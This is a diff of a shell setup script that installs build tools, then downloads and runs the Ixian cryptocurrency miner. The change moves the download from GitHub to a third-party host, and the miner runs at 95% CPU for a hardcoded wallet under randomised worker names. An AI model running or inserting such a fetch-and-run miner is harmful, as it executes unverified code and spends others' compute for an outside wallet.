@@ -5,6 +5,6 @@ dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-wget https://github.com/ixian-platform/Ixian-Miner/releases/download/v0.6.5/IxianMiner-v0.6.5-Linux.tar.gz
-tar xvf IxianMiner-v0.6.5-Linux.tar.gz
+wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz && tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz && cd iximiner_v0.3.0_22.08.2022_linux
+
 ./iximiner --mode miner --pool http://mineixi.com --wallet 4sZ9fdGKwRkbbPKJ28ZLxpRcDmLcysweypjUxw5rGbLjzAT7fLjNPFHivsVGmCV3w --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 95 --gpu-intensity 0
